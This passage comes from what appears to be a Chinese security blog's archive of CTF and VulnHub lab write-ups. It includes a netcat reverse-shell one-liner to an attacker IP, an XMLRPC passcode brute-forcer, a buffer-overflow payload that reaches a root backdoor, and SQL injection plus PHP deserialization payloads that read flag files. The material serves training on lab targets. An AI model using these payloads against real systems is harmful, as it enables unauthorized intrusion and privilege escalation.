<tr class="even">
<td style="text-align: center;"><code>21232f297a57a5a743894a0e4a801fc3</code></td>
<td style="text-align: center;">5d9c68c6c50ed3d02a2fcf54f63993b6</td>
<td style="text-align: center;">testuser</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>hdfzzf@123.com</code></td>
<td style="text-align: center;">249abd700757d98f77fa6ff4f0c2a750</td>
<td style="text-align: center;">hdfzzf</td>
</tr>
</tbody>
</table>
<p>此时就可以使用admin的邮箱和密码登录。</p>
<p>发现一条靶机系统上有一个<code>monitor.py</code>脚本。其他并没有什么特别的。</p>
<h2 id="反弹shell">反弹shell</h2>
<p>蚁剑获得的shell功能不够，因此需要用nc反弹或者python，然后进行shell升级。</p>
<p>kali先监听3333端口，然后蚁剑shell上执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
<p>然后进行shell升级，和之前一样，这里不多赘述</p>
<h2 id="cve-2021-3493提权">CVE-2021-3493提权</h2>
<p>Ubuntu有一个CVE-2021-3493，可以直接进行本地提权。</p>
<p>漏洞利用下载地址：<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p>
<p>下载完之后，编译之后发送到靶机。然后再执行该exp即可。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214049.png" /></p>
<p>成功提权。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214121.png" /></p>
<p>这样子似乎很快，但是这台靶机是2020年出的，而该漏洞是2021年爆出的，因此，回归当年的环境，用别的方法提权。</p>
<h2 id="信息收集">信息收集</h2>
<p>下面命令可以获得具体发行版本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406110128.png" /></p>
<p>发现与<code>/bin/bahs</code>有关的用户： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214351.png" /></p>
<p>发现两个用户。这里其他信息收集的过程就不多赘述了。</p>
<p>记得刚刚有一个脚本<code>monitor.py</code>，在<code>/home/socnet</code>目录下找到了它，查看源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
<p>这里有一个技术：<a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">XMLRPC</a></p>
<p>（这个脚本也解释了为什么在访问8000端口的时候不接受所有的请求方式！）</p>
<p>简单来说就是客户端可以通过该技术调用服务端提供的函数。而查看进程发现，该脚本处于运行状态。通过代码审计发现，靶机作为服务端启动服务，并且有多个函数，注意到最后一个<code>secure_cmd</code>，只要满足条件，就能够执行任意代码。我们并不知道<code>debugging_pass</code>值是多少，这是通过随机函数在脚本刚执行时随机的一个值，但是也就几千个，直接爆破即可。</p>
<h2 id="第一次权限提升xmlrpc命令执行">第一次权限提升——XMLRPC命令执行</h2>
<p>编写如下脚本爆破<code>debugging_pass</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">		r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&quot;whoami&quot;</span>, i))</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">		    <span class="built_in">print</span>(r)</span><br><span class="line">		    <span class="built_in">print</span>(<span class="string">&quot;the value of debugging_pass is %d&quot;</span> % i)</span><br><span class="line">		    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405221433.png" /></p>
<p>得到<code>debugging_pass=5166</code>，并且发现执行的结果是<code>socnet</code>。如果利用该脚本反弹shell，那么获得的shell就是<code>socnet</code>的。</p>
<p>此时再次执行nc反弹 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot;</span></span><br><span class="line">    p = <span class="number">5166</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the script is running:&quot;</span>)</span><br><span class="line">    proxy.secure_cmd(cmd, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405222307.png" /></p>
<p>成功提权到<code>socnet</code>。然后再次进行shell升级。</p>
<h2 id="第二次权限提升缓存区溢出漏洞">第二次权限提升——缓存区溢出漏洞</h2>
<p>（我不懂，没学过，跟着视频来的）</p>
<p>首先，在<code>socnet</code>的家目录下有三个文件（目录），并且<code>add_record</code>具有SUID，所有者为root。因此，想办法通过该可执行文件获得root权限。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405223223.png" /></p>
<p>注意到<code>peda</code>，这是一款动态调试的工具。<a href="https://www.jianshu.com/p/283b5466684b">peda信息</a></p>
<p>思路：动态调试<code>add_record</code>，找到缓冲区溢出漏洞，利用漏洞</p>
<h3 id="动态调试">动态调试</h3>
<p>首先执行该程序，发现需要依次填写多个信息：</p>
<ol type="1">
<li>Employee Name</li>
<li>Years worked</li>
<li>Salary</li>
<li>Ever got in trouble?</li>
<li>如果上个问题答案为1，则填写Explain；否则程序结束。</li>
</ol>
<p>输入下述命令开始动态调试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record</span><br><span class="line"></span><br><span class="line">再次输入r才可以执行该程序。</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如何找缓冲去漏洞呢？首先就是生成一长串的字符A，然后找到所有的数据提交点，每次测试一个提交点。比如上述有5个提交点，第一次将生成的字符串输入到Employee Name，其他提交点正常传入数据，以此类推。 这样就可以通过查看其他寄存器是否充满字符A来判断是否存在缓冲区漏洞。</p>
</blockquote>
<p>这里做一组对比，第一组测试<code>Employee Name</code>：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224330.png" /></p>
<p>直接退出程序，说明该提交点并不存在缓冲区漏洞。</p>
<p>第二组测试<code>Explain</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224520.png" /></p>
<p>可以看到许多寄存器都是A，证明该提交点存在缓冲区溢出漏洞。<strong>注意寄存器<code>EIP</code>，该寄存器存放的是CPU执行的下一条指令的存放地址</strong>。</p>
<p>接着，需要判断EIP中的4个A是提交的字符串中的哪几个，可以先不断减少字符A的个数，然后提交，直到找到。也可以生成特征字符串（每4个为一个子串，在整个字符串中。子串是唯一的） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create [len] # 长度至少要保证EIP中充满A</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225135.png" /></p>
<p>然后利用命令自动查找位置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern search</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225310.png" /></p>
<p>EIP的第一个字符在特征字符串的位置是62（位置从0开始），因此，EIP在字符串中的位置就是62，63，64，65四个位置。可以验证一下，生成如下字符串：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225456.png" /></p>
<p>然后带入进去，如果此时EIP内是BCDE，则代表位置正确。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225548.png" /></p>
<p>位置正确</p>
<h3 id="查看汇编代码">查看汇编代码</h3>
<h4 id="该程序的汇编代码">该程序的汇编代码</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230105.png" /></p>
<p>尖括号里面是函数，带<code>@plt</code>的是自带的函数，不带的则是自己编写的函数。<code>call</code>代表调用。最前面的16进制数字表示该指令存放的内存地址。</p>
<p>可以通过打断点调试，测试函数的功能（以<code>0x080487ea</code>为例，断点要打在这句话的前一个位置）。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *0x080487e7</span><br><span class="line">r</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230637.png" /></p>
<p>当输入1之后程序停止了，输入<code>s</code>单步运行，然后正好到我们要测试的函数<code>getchar@plt</code>，说明这里的作用就是获得我们的输入。</p>
<p>注意到这里有一个<code>vuln</code>的函数。可以利用<code>info func</code>查看该程序的所有函数，发现里面有<code>system@plt, setuid@plt, vuln, backdoor</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231236.png" /></p>
<h4 id="vuln函数的汇编代码">vuln函数的汇编代码</h4>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231350.png" /></p>
<p>注意<code>strcpy@plt</code>，这个函数存在着漏洞。<a href="https://stackoverflow.com/questions/48356481/exploiting-strcpy-in-c-with-buffer-overflow">strcpy缓冲区溢出漏洞</a></p>
<p>因此，之前测试的缓冲区溢出漏洞出现的原因就是主函数调用<code>vuln</code>，然后<code>vuln</code>又调用了该函数造成的。</p>
<h4 id="backdoor函数的汇编代码">backdoor函数的汇编代码</h4>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231651.png" /></p>
<p>注意到这里先运行了<code>setuid</code>，然后运行了<code>system</code>，也就是此时的<code>system</code>可能是以root权限运行的。那么此时就需要知道<code>system</code>执行了什么命令。</p>
<p><strong>复制<code>backdoor</code>第一条指令的地址。然后利用缓冲区溢出的漏洞，将该地址放到EIP中，这样，随着程序的执行，就会将<code>backdoor</code>函数调用</strong>。</p>
<blockquote>
<p>可以生成一个文件，把每一个问题的回答都写入，回答之间用换行符分割，然后 r &lt; filename，自动化执行。</p>
</blockquote>
<p>第一步，生成一个文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import struct; print(&#x27;h\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103054.png" /></p>
<p>（观察前面注入BCDE的时候，EIP内容是BCDE，但是16进制是0x45444342，可以看到顺序被颠倒了，因此，我们写入backdoor函数的第一条指令的地址的时候也需要颠倒以下写进去，所以使用<code>struct.pack</code>）</p>
<p>第二步，执行命令 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r &lt; payload</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103200.png" /></p>
<p>注意下几句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[New process 4825]</span><br><span class="line">process 4825 is executing new program: /bin/dash</span><br><span class="line">[New process 4826]</span><br><span class="line">process 4826 is executing new program: /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>当我们往<code>EIP</code>写入<code>backdoor</code>指令后，该程序就会自动调用<code>backdoor</code>函数，结果如上。如果没有调用该函数，那么就不会出现上述结果。因此，<code>backdoor</code>函数执行了<code>/bin/bash</code>和<code>/bin/dash</code>，并且在该程序执行完毕之后退出。</p>
<p>因此，我们只需要正常的执行程序，然后在Explain处将<code>backdoor</code>函数的第一条指令写入到<code>EIP</code>寄存器即可获得root权限。</p>
<p>第三步，动态调试验证 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break vuln </span><br></pre></td></tr></table></figure></p>
<p>单步执行到<code>backdoor</code>函数之后就需要慢点操作了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104348.png" /></p>
<p>单步执行到<code>setuid</code>函数。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104448.png" /></p>
<p>该函数执行完毕之后取得suid权限。然后注意单步执行到下图：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105131.png" /></p>
<p>将<code>/bin/bash</code>写入到EAX寄存器，然后调用<code>system</code>函数去执行EAX中的指令，这样得到的结果就是root权限的shell。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105554.png" /></p>
<p>（管道符前面的减号的意思是将payload中的内容作为标准输入输出。）</p>
<p>成功获得root权限，这台靶机到此就全部结束了。</p>
<h1 id="总结">总结</h1>
<p>这台靶机难度很大，涉及到了<strong>缓冲区溢出漏洞</strong>，这是我第一次见识到这种漏洞，因此可能存在着错误。</p>
<p>Linux提权中优先考虑：内核漏洞、SUID、SUDO配置。但是这台靶机将SUID和缓冲区溢出漏洞结合在一起。这为提权带来了一种思路！</p>
<p>如果http服务存在着注册功能点，一定要尝试一下，看一些登陆进去的界面是否存在着漏洞！但是，千万别写真实的个人信息。</p>
<p>遇到新的技术——XMLRPC，需要快速的掌握其工作原理。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>XMLRPC命令执行</tag>
        <tag>缓冲区溢出漏洞</tag>
        <tag>动态调试</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
<h1 id="第一次sql注入">第一次sql注入</h1>
<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
<h2 id="获取字段数">获取字段数</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
<h2 id="测试显示位">测试显示位</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
<p>上面的信息很丰富：</p>
<ul>
<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
<li>显示位为 2</li>
<li>地址为：<strong>/var/www/html/view.php</strong></li>
</ul>
<h2 id="常规注入">常规注入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
<h1 id="信息收集">信息收集</h1>
<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>（这里也说明，blog是有特殊的格式要求的。）</p>
<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
<h1 id="第二次sql注入">第二次sql注入</h1>
<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
<h1 id="其他注入方法">其他注入方法</h1>
<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb</title>
    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，会发现5秒后自动跳转到 index.php 页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
<p>这不是重点，接着我们抓包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code> 。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而 <code>p</code> 应该是一个参数。（上面表单中的<code>p</code> 是时间的格式，可能是参数）</p>
<h1 id="解题">解题</h1>
<p>将函数随便改一个试试看（这里 echo 并不是函数，主要想看看报错的信息）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
<p>注意 <code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
<p>更多信息请参考：<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
